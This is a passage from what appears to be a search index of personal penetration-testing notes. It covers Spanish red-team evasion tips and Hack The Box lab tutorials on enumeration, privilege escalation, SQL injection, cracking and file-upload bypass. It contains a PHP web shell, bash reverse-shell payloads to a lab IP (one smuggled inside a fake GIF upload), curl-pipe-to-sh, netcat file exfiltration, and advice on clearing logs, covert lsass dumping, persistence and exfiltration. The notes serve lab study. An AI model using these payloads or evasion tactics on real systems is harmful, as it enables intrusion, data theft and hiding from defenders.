Quickwins","text":"<ol> <li> <p>Aprende a programar en C/C++: Domina la creaci\u00f3n de cargadores din\u00e1micos de malware y m\u00f3dulos para tus ataques (especialmente en Cobalt Strike).</p> </li> <li> <p>Conoce el registro de eventos y evita dejar rastros: Aprende a logear y borrar evidencias en las m\u00e1quinas objetivo para operar de forma sigilosa.</p> </li> <li> <p>Desarrolla movimientos laterales discretos: Busca t\u00e9cnicas de movimiento lateral que no sean f\u00e1ciles de detectar, como DCOM en lugar de m\u00e9todos convencionales como PsExec o WMIExec.</p> </li> <li> <p>Extracci\u00f3n de volcados de lsass de manera no convencional: Investiga el uso de handles leakeados de lsass para extraer volcados sin alertar a los sistemas de seguridad.</p> </li> <li> <p>Aprovecha BloodHound para identificar objetivos de valor: Utiliza BloodHound no solo para encontrar vulnerabilidades, sino tambi\u00e9n para identificar servidores relevantes, como servidores MSSQL, mediante la b\u00fasqueda de SPNs.</p> </li> <li> <p>Prioriza autenticaciones Kerberos y evita RC4: Utiliza siempre autenticaciones Kerberos y evita el uso de RC4, optando por AES cuando sea posible. Usa credenciales de admin local para reducir la telemetr\u00eda en el DC.</p> </li> <li> <p>Persitencia sin llamar la atenci\u00f3n: Evita dejar rastros sospechosos utilizando t\u00e9cnicas como DLL hijacking en lugar de registros o startups en ubicaciones obvias.</p> </li> <li> <p>B\u00fasqueda de credenciales en las m\u00e1quinas: Explora el Credential Vault en busca de credenciales, ya que puedes encontrar informaci\u00f3n valiosa como user:pass de sitios web relevantes, lo que te permitir\u00e1 moverte lateralmente con facilidad.</p> </li> <li> <p>Usa SOCKS5 para acciones no locales: Cuando realices acciones en m\u00e1quinas remotas, como accesos SMB, MSSQL, RPC o DCOM, siempre utiliza SOCKS5 para dificultar la detecci\u00f3n de actividad maliciosa.</p> </li> <li> <p>Registra tu Command and Control en dominios de alta reputaci\u00f3n: Para evitar levantar sospechas, aloja tu Command and Control en dominios de confianza. Emplea protocolos dif\u00edciles de detectar: Utiliza HTTPS o DNS para evitar la detecci\u00f3n, aunque ten en cuenta que el uso de DNS puede afectar la velocidad.</p> </li> <li> <p>Exfiltraci\u00f3n de archivos de gran tama\u00f1o: Sube archivos al SharePoint del objetivo y desc\u00e1rgalos desde tu navegador. Otra opci\u00f3n es subirlos a servicios como Mega.</p> </li> <li> <p>Evita cuentas super administrativas: En lugar de atacar cuentas de Domain Admin o Enterprise Admin, apunta a grupos de cuentas con admin local en varias m\u00e1quinas.</p> </li> <li> <p>Escoge cuentas activas recientemente: Prefiere pwnear cuentas que hayan tenido actividad reciente, evitando cuentas inactivas durante largos per\u00edodos.</p> </li> <li> <p>Escalada por ADCS: Utiliza ADCS como vector de escalada para obtener acceso a cuentas privilegiadas.</p> </li> <li> <p>Persistencia con ADCS: Emplea certificados ADCS para mantener la persistencia en cuentas de dominio privilegiadas, ya que no expiran a menos que sean revocados.</p> </li> <li> <p>Evita crear cuentas privilegiadas: La creaci\u00f3n de cuentas administrativas en el dominio es riesgosa y puede llamar la atenci\u00f3n.</p> </li> <li> <p>Borra evidencias al salir: Cuando termines tus operaciones en una m\u00e1quina, borra todas las evidencias, incluyendo el historial del navegador si es necesario.</p> </li> <li> <p>Acceso antes que implantaci\u00f3n: Intenta acceder a m\u00e1quinas a trav\u00e9s de RDP u otros m\u00e9todos antes de implantar tu malware, para reducir las posibilidades de detecci\u00f3n.</p> </li> <li> <p>Impacket, tu aliado: Convi\u00e9rtete en un experto en Impacket, una herramienta indispensable en el arsenal de un Red Teamer.</p> </li> <li> <p>Cautela con lsass: Evita tocar lsass a menos que sea estrictamente necesario, ya que suele alertar a los equipos de defensa.</p> </li> <li> <p>Escaneos de BloodHound: Realiza escaneos de BloodHound con la opci\u00f3n \"ldaponly\" para minimizar el ruido y pasar desapercibido.</p> </li> <li> <p>Practica con Elastic Security: Monta un laboratorio de pruebas con Elastic Security para poner a prueba tus habilidades y mejorar tu metodolog\u00eda.</p> </li> </ol>"},{"location":"Tutorials/active_directory/oneliners-ad/","title":"Oneliners ad","text":"<p>RPClient</p> <pre><code>rpcclient -U \"\" 10.129.252.217 -N -c 'enumdomusers' | grep -oP '\\[.*?\\]' | grep -v 0x | tr -d '[]'\n</code></pre>"},{"location":"Tutorials/cloud/aws/","title":"AWS","text":"<p>AWS is a cloud provider, it offers a wide range of services.</p>"},{"location":"Tutorials/cloud/aws/#s3-bucket","title":"S3 Bucket","text":"<p>aws-cli</p> <p>Check for bucket without protection:</p> <pre><code>aws --endpoint=&lt;URL&gt; s3 ls\n</code></pre>"},{"location":"Tutorials/common/excalation/","title":"Excalation","text":""},{"location":"Tutorials/common/excalation/#privilege-escalation","title":"Privilege Escalation \ud83e\ude9c","text":"<p>First steps on what to do after getting a shell on a machine. After stabilizing the shell.</p> <pre><code>sudo -l # Check for sudo privileges\nenv # Check for environment variables\nfind / -perm -4000 -type f 2&gt;/dev/null # Check for files with `setuid` bit set\ncat /var/log/auth.log\ncat /etc/crontab\n</code></pre>"},{"location":"Tutorials/common/excalation/#enumeration","title":"Enumeration","text":"<pre><code>ps aux #List running processes\nid || (whoami &amp;&amp; groups) 2&gt;/dev/null #Info about me\ncat /etc/passwd | cut -d: -f1 #List all users\ncat /etc/passwd | grep \"sh$\" #List users with console\nawk -F: '($3 == \"0\") {print}' /etc/passwd #List superusers\nw #Currently logged users\nlast | tail #Login history\nlastlog #Last log of each user\n#List all users and their groups\nfor i in $(cut -d\":\" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort\ngpg --list-keys 2&gt;/dev/null #Current user PGP keys\n</code></pre> <pre><code>date 2&gt;/dev/null #Date\n(df -h || lsblk) #System stats\nlscpu #CPU info\nlpstat -a 2&gt;/dev/null #Printers info\nls -al /etc/nginx/sites-enabled #Nginx sites\ndoas # Check if doas is installed\n</code></pre> <p>If stuck, check the Privilege Escalation section of HackTricks.</p>"},{"location":"Tutorials/common/shell/","title":"Shell","text":""},{"location":"Tutorials/common/shell/#reverse-shell","title":"Reverse Shell","text":"<p>revshell is a website that provides reverse shell payloads for various programming languages.</p>"},{"location":"Tutorials/common/shell/#stability","title":"Stability","text":"<p>When you have a reverse shell, it is important to stabilize it. This is because the shell may be unstable and may not be able to run certain commands. You can stabilize the shell by running the following command.</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>script /dev/null -c bash\n</code></pre> <pre><code>CTRL+Z\nstty raw -echo; fg\n</code></pre> <pre><code>export TERM=xterm\nexport SHELL=bash\n</code></pre>"},{"location":"Tutorials/common/wordlists/","title":"Wordlists","text":"<p>Wordlists are a collection of words that are used for brute-forcing, password cracking, and other security-related tasks. They are often used in combination with tools like <code>hydra</code>, <code>john</code>, and <code>hashcat</code>.</p> <ul> <li>SecLists</li> </ul>"},{"location":"Tutorials/databases/sql/","title":"Sql","text":""},{"location":"Tutorials/databases/sql/#sql-injection","title":"SQL Injection","text":"<p>https://portswigger.net/web-security/sql-injection</p> <p>If there is a input field in a web page, you can try to inject SQL commands to the database.</p> <pre><code>' OR 1=1 --\n</code></pre> <pre><code>' UNION SELECT 1,2,3 --\n</code></pre>"},{"location":"Tutorials/databases/sql/#detect-mysql-port-and-version","title":"Detect MySQL Port and Version","text":"<pre><code>nmap -p- &lt;IP&gt; -oA fullport --min-rate=10000\nStarting Nmap 7.80 ( https://nmap.org ) at 2024-02-10 19:48 -03                      \nNmap scan report for 10.129.95.232 (10.129.95.232)                                   \nHost is up (0.20s latency).                                                          \nNot shown: 65534 closed ports                                                        \nPORT     STATE SERVICE\n3306/tcp open  mysql \n</code></pre> <pre><code>user in ~ \u03bb telnet 10.129.95.232 3306                                            \nTrying 10.129.95.232...                                                              \nConnected to 10.129.95.232.\nEscape character is '^]'.\n5.5.5-10.3.27-MariaDB-0+deb10u13\"f^#3toS-19h\"n\n</code></pre>"},{"location":"Tutorials/databases/sql/#connect-with-weak-credentials","title":"Connect with weak credentials","text":"<pre><code>mysql -h &lt;IP&gt; -u root\n</code></pre>"},{"location":"Tutorials/databases/sql/#commannds","title":"Commannds","text":"<pre><code>SHOW DATABASES;\nuse &lt;DATABASE&gt;;\nSHOW TABLES;\n</code></pre>"},{"location":"Tutorials/languages/php/","title":"PHP","text":"<p>Common exploits in PHP.</p>"},{"location":"Tutorials/languages/php/#cookies","title":"Cookies","text":"<p><code>PHPSESSID</code> is the default session cookie name.</p>"},{"location":"Tutorials/languages/php/#web-shell","title":"Web shell","text":"<pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre>"},{"location":"Tutorials/languages/php/#reverse-shell","title":"Reverse shell","text":"<pre><code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1'\");?&gt;\n</code></pre>"},{"location":"Tutorials/languages/php/#examples","title":"Examples","text":"<pre><code>http://&lt;IP&gt;:45338/?format=${system($_GET[id])}&amp;id=cat%20../flag.txt\n</code></pre>"},{"location":"Tutorials/languages/python/","title":"Python","text":"<p>We can use Python for a variety of tasks, including:</p>"},{"location":"Tutorials/languages/python/#start-a-web-server","title":"Start a web server","text":"<pre><code>python3 -m http.server 8000\n</code></pre>"},{"location":"Tutorials/languages/python/#download-a-file-from-the-web-server","title":"Download a file from the web server","text":"<pre><code>wget http://&lt;IP&gt;:8000/file\n</code></pre>"},{"location":"Tutorials/languages/python/#execute-a-file-from-the-web-server","title":"Execute a file from the web server","text":"<pre><code>curl http://&lt;IP&gt;:8000/file | sh\n</code></pre>"},{"location":"Tutorials/languages/python/#monitor-a-file","title":"Monitor a file","text":"<p>We can use <code>pspy</code> to monitor a file.</p> <pre><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64\nchmod +x pspy64\n./pspy64 &lt;FILE&gt;\n</code></pre>"},{"location":"Tutorials/logs/emails/","title":"Emails","text":""},{"location":"Tutorials/logs/emails/#common-routes-to-found-email-logs","title":"Common routes to found email logs","text":"<pre><code>/var/log/maillog\n/var/log/mail.log\n/var/adm/maillog\n/var/adm/syslog/mail.log\n/var/mail/&lt;user&gt;\n</code></pre>"},{"location":"Tutorials/logs/sql/","title":"Sql","text":""},{"location":"Tutorials/logs/sql/#common-routes-to-found-sql-logs","title":"Common routes to found sql logs","text":"<pre><code>/var/opt/mssql/log/errorlog\n</code></pre>"},{"location":"Tutorials/scripting/shc/","title":"SHC","text":"<p>Shell script compiler is a tool that compiles a script written in bash or sh to a binary file. This binary file can be executed on any system that has the same architecture as the system on which the script was compiled.</p>"},{"location":"Tutorials/scripting/shc/#installation","title":"Installation","text":""},{"location":"Tutorials/scripting/shc/#debianubuntu","title":"Debian/Ubuntu","text":"<pre><code>sudo add-apt-repository ppa:neurobin/ppa\nsudo apt-get update\nsudo apt-get install shc\n</code></pre>"},{"location":"Tutorials/scripting/shc/#usage","title":"Usage","text":"<pre><code>shc -f script.sh -o script\n</code></pre> <p>Where:</p> <ul> <li><code>-f</code> is the input file</li> <li><code>-o</code> is the output file</li> </ul> <p>After running the above command, a binary file named <code>script</code> will be created.</p> <p>We can execute the binary file as follows:</p> <pre><code>./script\n</code></pre> <p>Or better we could move the binary file to a directory in the PATH and execute it from anywhere.</p> <pre><code>sudo mv script /usr/local/bin\nscript\n</code></pre>"},{"location":"Tutorials/software/burp/","title":"Burp Suite","text":"<p>Burp Suite is a set of tools for web application security testing.</p> <p>First and foremost, use the button <code>open browser</code> to open a browser that is configured to use Burp Suite as a proxy.</p>"},{"location":"Tutorials/software/burp/#decoder","title":"Decoder","text":"<p>Decoder is a tool that can be used to decode/encode data. It is a very useful tool for web application security testing.</p> <p></p> <p>In this example we encoded a string into base64.</p>"},{"location":"Tutorials/software/burp/#repeater","title":"Repeater","text":"<p>Repeater is a tool that can be used to repeat requests. Specially usefull when want to do crafted payloads.</p> <p></p> <p>While you are here, you can click on a request then CTRL+R to send it to the repeater. or second click on the request and select <code>Send to Repeater</code>.</p> <p></p> <p>And here we can modify the request and send it again.</p>"},{"location":"Tutorials/software/curl/","title":"Curl","text":"<p>curl is a command line tool to transfer data to or from a server.</p>"},{"location":"Tutorials/software/curl/#send-a-request-with-payload","title":"Send a request with payload","text":"<pre><code>curl -X POST http://example.com -d '{\"data\": \"value\"}'\n</code></pre>"},{"location":"Tutorials/software/curl/#escape-characters","title":"Escape characters","text":"<pre><code>curl -X POST http://example.com -d '{\\\"data\\\": \\\"value\\\"}'\n</code></pre>"},{"location":"Tutorials/software/curl/#send-url-encoded-data","title":"Send URL encoded data","text":"<pre><code>curl -X POST http://example.com --data-urlencode 'data=value'\n</code></pre>"},{"location":"Tutorials/software/curl/#multi-line-command","title":"Multi line command","text":"<pre><code>curl -X POST http://example.com \\\n-d '{\\\"data\\\": \\\"value\\\"}' \\\n-H 'Content-Type: application/json' \\\n| jq\n</code></pre>"},{"location":"Tutorials/software/keepass/","title":"Keepass","text":"<p>Keepass is a password manager that stores passwords in a single encrypted file. It is a good idea to use a password manager to store passwords, as it allows for the use of long, complex passwords that are unique to each service.</p>"},{"location":"Tutorials/software/keepass/#dumping-keepass-passwords","title":"Dumping KeePass Passwords","text":"<p>Requirements</p> <p><code>.dmp</code> file</p> <p>dump-password</p>"},{"location":"Tutorials/software/mongodb/","title":"MongoDB","text":""},{"location":"Tutorials/software/mongodb/#installation","title":"Installation","text":"<ul> <li>https://www.mongodb.com/try/download/shell</li> </ul>"},{"location":"Tutorials/software/mongodb/#usage","title":"Usage","text":"<p>Connect to the mongodb with the IP and port <code>mongosh --host &lt;IP&gt;:27017</code></p>"},{"location":"Tutorials/software/mongodb/#basic-commands","title":"Basic commands","text":"<ul> <li><code>show dbs</code></li> <li><code>use &lt;db&gt;</code></li> <li><code>show collections</code></li> <li><code>db.&lt;collection&gt;.find()</code></li> </ul>"},{"location":"Tutorials/software/samba/","title":"Samba","text":"<p>Samba is a free software re-implementation of the SMB/CIFS networking protocol. It allows file and print sharing between computers running Microsoft Windows and computers running Unix-like operating systems.</p> <p>Ports: 139, 445</p>"},{"location":"Tutorials/software/samba/#smbclient","title":"smbclient","text":"<p>docs</p> <pre><code>smbclient \\\\\\\\&lt;target-ip&gt;\\\\&lt;share-name&gt;\n</code></pre>"},{"location":"Tutorials/software/sqlmap/","title":"Sqlmap","text":"<p>Sqlmap is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.</p>"},{"location":"Tutorials/software/sqlmap/#blind-sql-injection","title":"Blind SQL injection","text":"<p>We can inject SQL code but not see the output.</p> <pre><code>sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --dbs --threads 10 --\nlevel 5 --risk 3 --batch\n</code></pre> <ul> <li><code>-u</code> Target URL</li> <li><code>--data</code> Data string to be sent through POST (e.g. \"id=1\")</li> <li><code>--dbs</code> Enumerate DBMS databases</li> <li><code>--threads</code> Max number of concurrent HTTP(s) requests (default 1)</li> <li><code>--level</code> Level of tests to perform (1-5, default 1)</li> <li><code>--risk</code> Risk of tests to perform (1-3, default 1)</li> <li><code>--batch</code> Never ask for user input, use the default behavior</li> </ul> <p>If we found a DB we can dump its content with:</p> <pre><code>sqlmap -u &lt;URL&gt; --data '{\"&lt;FIELD&gt;\": \"*\" }' --threads &lt;NUMBER&gt; -D &lt;database_name&gt; --dump --batch\n</code></pre> <ul> <li><code>D</code> DBMS database to enumerate</li> <li><code>--dump</code> Dump DBMS database table entries</li> </ul>"},{"location":"Tutorials/software/sqlmap/#docs","title":"Docs","text":"<ul> <li>https://github.com/sqlmapproject/sqlmap/wiki/Usage</li> </ul>"},{"location":"Tutorials/software/tmux/","title":"Tmux","text":"<p>Tmux is a terminal multiplexer. It allows you to create multiple terminal sessions in a single window.</p>"},{"location":"Tutorials/software/tmux/#use-session","title":"Use session","text":"<pre><code>tmux -S &lt;session_name&gt;\n</code></pre>"},{"location":"Tutorials/software/tmux/#cheat-sheet","title":"Cheat Sheet","text":"<ul> <li>tmux-cheat-sheet</li> </ul>"},{"location":"Tutorials/standards/owasp/","title":"Owasp","text":""},{"location":"Tutorials/standards/owasp/#remote-code-execution","title":"Remote Code Execution","text":"<p>What is RCE?</p> <p>Remote Code Execution (RCE) is a type of vulnerability that allows an attacker to execute arbitrary code on a target server or application. This can be used to gain access to the server, steal data, or perform other malicious activities.</p>"},{"location":"Tutorials/standards/owasp/#htb-challenge","title":"HTB Challenge","text":"<p>https://app.hackthebox.com/challenges/177</p>"},{"location":"Tutorials/standards/owasp/#resolution","title":"Resolution","text":"<p>The challenge looks like this</p> <p></p> <p>We have 2 select boxes and one input, so our attention goes to the input, we can try to inject some code to see if we can get a response from the server.</p> <p>First we try to do the write box part to see how the server responds.</p> <p></p> <p>Now since this is running bash, we can try to add a <code>;</code> at the end of the <code>localhost</code> and execute another command.</p> <p></p> <p>We got confirmation that we are executing commands, now instead of <code>id</code> i'm going to find the flag with this command <code>localhost; ls / | grep -i \"flag\"</code></p> <p>At this point we should find a file called <code>flag_xxx</code></p> <p>Now we can do <code>localhost; cat &lt;name&gt;</code> to see the content of the file.</p>"},{"location":"Tutorials/system/bin/","title":"GTFOBins \ud83d\udd22","text":"<p>GTFOBins</p> <p>This is a collection of <code>binaries</code> that can be used to bypass local security restrictions in misconfigured systems. </p> <pre><code>/usr/bin/journalctl -n5 -unostromo.service\n</code></pre> <pre><code>!/bin/bash\n</code></pre> <p>Pay attention because kitty has trouble with the interactive shell.</p>"},{"location":"Tutorials/system/ftp/","title":"FTP \ud83d\udcc1","text":"<p>FTP (File Transfer Protocol) is a standard network protocol used to transfer files from one host to another host over a TCP-based network, such as the Internet.</p>"},{"location":"Tutorials/system/ftp/#connect-to-ftp-via-anonymous-login","title":"Connect to FTP via anonymous login","text":"<pre><code>ftp &lt;IP&gt;\n</code></pre> <p>When prompted for a username, type <code>anonymous</code> and press enter. When prompted for a password, press enter.</p> <p>Download files in the FTP server</p> <pre><code>get &lt;file&gt;\n</code></pre>"},{"location":"Tutorials/system/netcat/","title":"Netcat","text":"<p>Netcat is a simple Unix utility which reads and writes data across network connections, using the TCP/IP protocol.</p>"},{"location":"Tutorials/system/netcat/#listen-on-a-port","title":"Listen on a port","text":"<pre><code>nc -lvpn 4444\n</code></pre>"},{"location":"Tutorials/system/netcat/#transfer-files","title":"Transfer files","text":"<p>On your machine: <pre><code>nc -lvnp 1337 &gt; backup.tar.gz\n</code></pre></p> <p>On the target machine: <pre><code>nc 10.10.14.7 1337 &lt; backup.tar.gz\n</code></pre></p>"},{"location":"Tutorials/system/nmap/","title":"Nmap","text":"<p>Nmap is a network scanner that can be used to discover hosts and services on a computer network.</p>"},{"location":"Tutorials/system/nmap/#usage","title":"Usage","text":"<pre><code>nmap -p- -T4 &lt;IP&gt; -oA fullport --min-rate 5000\n</code></pre> <ul> <li><code>-p-</code> : Scan all ports</li> <li><code>-T4</code> : Set the timing template to 4 (aggressive)</li> <li><code>-oA</code> : Output in all formats</li> <li><code>--min-rate</code> : Send packets at a minimum rate of 5000 per second</li> <li><code>sV</code> : Probe open ports to determine service/version info</li> <li><code>--open</code> : Only show open ports</li> </ul>"},{"location":"Tutorials/system/nmap/#scripts-for-nmap","title":"Scripts for NMAP","text":"<pre><code>nmap --script dns-brute &lt;IP&gt;\n</code></pre> <ul> <li><code>dns-brute</code> : Brute force subdomains</li> </ul>"},{"location":"Tutorials/system/nmap/#vulnerability-scanning","title":"Vulnerability scanning","text":"<pre><code>nmap --script vuln -o vul &lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/nmap/#location-of-nmap-scripts","title":"Location of NMAP scripts","text":"<pre><code>ls /usr/share/nmap/scripts/\n</code></pre>"},{"location":"Tutorials/system/nmap/#script-redis","title":"Script redis","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</p> <pre><code>nmap --script redis-info -p 6379 &lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/nmap/#cheatsheet","title":"Cheatsheet","text":"<p>stationx</p>"},{"location":"Tutorials/system/ports/","title":"Ports","text":"<p>Related to ports and how to interact with them.</p>"},{"location":"Tutorials/system/ports/#check-open-ports","title":"Check open ports","text":"<pre><code>ss -tunl\nnetstat -tunl\n</code></pre>"},{"location":"Tutorials/system/ports/#port-forwarding","title":"Port forwarding","text":"<p>read</p> <pre><code>ssh -L &lt;LOCAL_PORT&gt;:&lt;REMOTE_HOST&gt;:&lt;REMOTE_PORT&gt; &lt;USER&gt;@&lt;GATEWAY&gt;\nssh -L 1111:127.0.0.1:8080 matthew@surveillance.htb\n</code></pre>"},{"location":"Tutorials/system/rsync/","title":"Rsync","text":"<p>Rsync is a fast and versatile file copying tool that can be used to copy files from one host to another. It is a powerful tool that can be used to synchronize files between two directories, or to copy files from one host to another. Rsync is a great tool for backing up files, and it can be used to copy files from one host to another over a network.</p>"},{"location":"Tutorials/system/rsync/#default-port","title":"Default PORT","text":"<p>Rsync uses port 873 by default.</p>"},{"location":"Tutorials/system/rsync/#anonymous-rsync","title":"Anonymous rsync","text":"<pre><code>rsync --list-only 10.129.136.195::\n</code></pre>"},{"location":"Tutorials/system/rsync/#download-files","title":"Download files","text":"<pre><code>rsync 10.129.136.195::public/file.txt file.txt\n</code></pre>"},{"location":"Tutorials/system/ssh/","title":"SSH","text":"<p>SSH (Secure Shell) is a network protocol that allows secure communication between two computers. It is used to log into a remote machine and execute commands.</p>"},{"location":"Tutorials/system/ssh/#connect-via-ssh","title":"Connect via ssh","text":"<pre><code>ssh user@&lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/ssh/#convert-putty-to-openssh","title":"Convert putty to openssh","text":"<pre><code>sudo apt install putty-tools\nputtygen putty.ppk -O private-openssh -o id_rsa\nchmod 600 id_rsa\n</code></pre>"},{"location":"Tutorials/system/ssh/#bruteforce","title":"Bruteforce","text":"<ul> <li>ssb</li> <li>hydra</li> </ul>"},{"location":"Tutorials/system/ssh/#known-username","title":"Known Username","text":"<pre><code>ssb -p &lt;PORT&gt; -w &lt;WORDLIST&gt; &lt;USER&gt;@&lt;IP&gt;\nhydra -l &lt;USER&gt; -t &lt;THREADS&gt; -P &lt;WORDLIST&gt; ssh://&lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/ssh/#private-key","title":"Private Key","text":"<pre><code>ssh -i id_rsa &lt;USER&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/ssh/#identitiesonly","title":"IdentitiesOnly","text":"<pre><code>ssh -o IdentitiesOnly=yes -i id_rsa &lt;USER&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"Tutorials/system/ssh/#crack-private-key","title":"Crack Private Key","text":"<p>ssh2john</p> <pre><code>ssh2john id_rsa &gt; id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\n</code></pre>"},{"location":"Tutorials/techniques/cracking/","title":"Cracking","text":""},{"location":"Tutorials/techniques/cracking/#hashes","title":"Hashes","text":"<p>hash identifier</p> <pre><code>hashid &lt;HASH&gt;\n</code></pre> <p>example hashes</p> <pre><code>hashcat -m &lt;MODE&gt; &lt;HASH&gt; &lt;WORDLIST&gt;\nhashcat -m 22931 ../wordlists/users/ssh_david.txt ../wordlists/rockyou.txt\n</code></pre>"},{"location":"Tutorials/techniques/cracking/#mash-attack","title":"Mash attack","text":"<p>When we know the password length or the password pattern</p> <pre><code>hashcat -a 3 -m 1400 &lt;HASH&gt; &lt;PASSWORD&gt;&lt;MASK&gt; # https://hashcat.net/wiki/doku.php?id=mask_attack\n</code></pre>"},{"location":"Tutorials/techniques/cracking/#ssh","title":"SSH","text":"<p>read</p> <pre><code>ssh2john id_rsa &gt; id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\n</code></pre>"},{"location":"Tutorials/techniques/cracking/#zip","title":"ZIP","text":"<pre><code>sudo apt install fcrackzip\nfcrackzip -u -D -p rockyou.txt &lt;FILE&gt;\n</code></pre>"},{"location":"Tutorials/techniques/cracking/#find-strings","title":"Find strings","text":"<p>We can use <code>strings</code> to find strings in a file</p> <p>It can be a database, a binary, a .exe, a disk, etc.</p> <pre><code>strings &lt;FILE&gt;\n</code></pre>"},{"location":"Tutorials/techniques/discovery/","title":"Discovery","text":"<p>Discovery is the process of finding information about a target. This can include finding open ports, services, and directories.</p>"},{"location":"Tutorials/techniques/discovery/#feroxbuster","title":"Feroxbuster","text":"<p>feroxbuster</p> <pre><code>`feroxbuster --insecure -u http://10.10.10.75/nibbleblog -o ferox -w ~/Documents/Security/wordlists/php.txt`\n</code></pre> <ul> <li><code>--insecure</code> : Ignore SSL certificate errors</li> <li><code>-u</code> : URL to scan</li> <li><code>-o</code> : Output directory</li> <li><code>-w</code> : Wordlist to use</li> </ul>"},{"location":"Tutorials/techniques/discovery/#dirsearch","title":"Dirsearch","text":"<p>dirsearch</p> <pre><code>dirsearch -u 40.121.87.195:60000 -w ~/Documents/Security/wordlists/raft-medium-directories.txt -t 100\n</code></pre> <ul> <li><code>-u</code> : URL to scan</li> <li><code>-w</code> : Wordlist to use</li> <li><code>-t</code> : Number of threads</li> </ul>"},{"location":"Tutorials/techniques/discovery/#amass","title":"Amass","text":"<p>amass</p>"},{"location":"Tutorials/techniques/discovery/#cheatsheet","title":"Cheatsheet","text":"<p>art-of-subdomain-enumeration pentester.land</p>"},{"location":"Tutorials/techniques/encode/","title":"Encode","text":"<p>Encoding is the process of converting data from one form to another. It is used to protect data from unauthorized access and to ensure that the data is not corrupted during transmission.</p> <p>base64</p>"},{"location":"Tutorials/techniques/encode/#encode-a-value-with-bash","title":"Encode a value with bash","text":"<p>read</p> <pre><code>echo -n \"id\" | base64\n## Result: aWQ=\n</code></pre>"},{"location":"Tutorials/techniques/encode/#execute-a-command-encoded","title":"Execute a command encoded","text":"<pre><code>echo \"aWQ=\" | base64 --decode | sh\n## Result: uid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"Tutorials/techniques/file_bypass/","title":"File by pass","text":"<p>In some cases, the web application will only allow certain file extensions to be uploaded. However, the application may not check the file content, only the file extension. This can be exploited by uploading a file with a valid extension, but with a different file type. For example, a PHP file can be uploaded with a <code>.jpg</code> extension. This can be used to execute code on the server.</p>"},{"location":"Tutorials/techniques/file_bypass/#example","title":"Example","text":"<pre><code>------WebKitFormBoundaryBqdknE02TXAj3VxC\nContent-Disposition: form-data; name=\"file\"; filename=\"reverse.php\"\nContent-Type: image/gif\n\nGIF87a;&lt;?php\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1'\");\n?&gt;\n\n------WebKitFormBoundaryBqdknE02TXAj3VxC\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit Screenshot\n------WebKitFormBoundaryBqdknE02TXAj3VxC--\n</code></pre> <p><code>GIF87a;</code> is the header of a GIF file. <code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;IP&gt; 0&gt;&amp;1'\"); ?&gt;</code> is the PHP code that will be executed on the server.</p> <p>Here, a PHP file is uploaded with a <code>.gif</code> extension. When the server processes the file, it will execute the PHP code and create a reverse shell.</p> <p>Then when we access this image, the server will execute the PHP code and create a reverse shell from the listener we have set up.</p> <pre><code>curl http://&lt;IP&gt;/uploads/reverse.php\n</code></pre>"},{"location":"Tutorials/techniques/file_bypass/#links","title":"Links","text":"<ul> <li>https://book.hacktricks.xyz/pentesting-web/file-upload</li> </ul>"},{"location":"Tutorials/techniques/fuzzing/","title":"Fuzzing","text":"<p>Fuzzing is a technique used to find vulnerabilities in software by providing unexpected input to the software. This can be done by providing unexpected input to a web application, or by providing unexpected input to a binary.</p>"},{"location":"Tutorials/techniques/fuzzing/#wfuzz","title":"Wfuzz","text":"<p>wfuzz</p> <pre><code>wfuzz --hw=153 -c -t 200 -w ~/Documents/Security/wordlists/common.txt http://40.121.87.195:60004/\\?file\\=..//FUZZ.txt\n</code></pre> <ul> <li><code>--hw</code> : Hide words with length equal to or less than the specified value</li> <li><code>-c</code> : Show output in color</li> <li><code>-t</code> : Number of threads</li> <li><code>-w</code> : Wordlist to use</li> <li><code>FUZZ</code> : Where the payload will be placed</li> </ul>"},{"location":"Tutorials/web/cookies/","title":"Cookies","text":"<p>Cookies are small pieces of data that are stored in the user's browser. They are used to store information about the user's session, such as their preferences, login status, and shopping cart contents.</p>"},{"location":"Tutorials/web/cookies/#example","title":"Example","text":"<pre><code>PHPSESSID=eyJ1c2VybmFtZSI6InRlc3QifQ%3D%3D\n</code></pre> <p>The <code>%3D</code> is the URL encoded version of <code>=</code>.</p> <p>Here we have a cookie that stores a value in base64, if we decode it we get:</p> <pre><code>{\"username\":\"test\"}\n</code></pre> <p></p> <p>Here we can see that the username is test.</p> <p>Which was the username I created in the application. Now if we want to instead use the username admin and encoded back to base64 we get:</p> <pre><code>PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIn0=\n</code></pre> <p></p> <p>Now we can see that the username is admin. This example is from a challenge called <code>baby auth</code> from <code>HTB</code></p> <ul> <li>https://app.hackthebox.com/challenges/179</li> </ul>"},{"location":"Tutorials/web/dns/","title":"DNS","text":"<p>DNS (Domain Name System) is a system that translates domain names to IP addresses. It is a distributed database that contains records for every domain name on the internet.</p>"},{"location":"Tutorials/web/dns/#locate","title":"Locate","text":"<p>Whenever we have an IP address, we can use wget to find the domain name.</p> <pre><code>wget --server-response 10.10.11.194      \n--2024-03-01 22:32:36--  http://10.10.11.194/\nConnecting to 10.10.11.194:80... connected.\nHTTP request sent, awaiting response... \n  HTTP/1.1 301 Moved Permanently\n  Server: nginx/1.18.0 (Ubuntu)\n  Date: Sat, 02 Mar 2024 01:32:37 GMT\n  Content-Type: text/html\n 